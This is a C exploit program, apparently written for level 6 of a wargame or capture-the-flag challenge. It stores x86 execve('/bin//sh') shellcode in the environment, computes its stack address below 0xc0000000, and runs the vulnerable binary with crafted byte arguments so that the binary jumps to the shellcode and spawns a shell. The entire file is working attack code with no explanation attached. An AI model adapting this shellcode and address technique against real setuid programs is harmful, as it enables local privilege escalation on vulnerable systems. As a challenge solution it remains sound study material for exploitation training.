#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#define VULN "/var/challenge/level6/6"

char shellcode [] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc, char **argv){
	
unsigned int addr, i;


char *params [] = {VULN,"200000000000000000","\xcc 44","\xff 45", "\xff 46", "\xbf 47",NULL};
char *env [] = {shellcode, NULL};

	addr = 0xc0000000 - 4 - strlen(VULN) - 1 - strlen(shellcode) - 1;

	fprintf(stderr, "Using address: %#010x\n",addr);

	execve(params[0],params,env);
	perror("execve");
	exit(1);
}

